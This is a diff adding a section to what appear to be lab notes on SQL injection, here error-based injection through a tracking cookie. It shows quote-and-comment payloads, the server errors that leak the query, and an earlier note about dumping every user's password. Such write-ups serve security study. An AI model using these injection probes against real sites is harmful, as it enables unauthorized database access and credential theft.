@@ -51,3 +51,14 @@ Nice no error, output is also coming means the number of columns is 1, now we ne
 </storeId>undefined</stockCheck>
 ```
 Nice got the username and password of all the users.
+### Visible error-based SQL injection
+```
+Cookie: TrackingId=X'
+500 Internal Server Error
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'X''. Expected  char
+```
+```
+Cookie: TrackingId=X'--
+200 OK
+```
+SQL confirmed, but the issue is we will not get any result in response. If the query fails then 500 error if not then 200 OK.
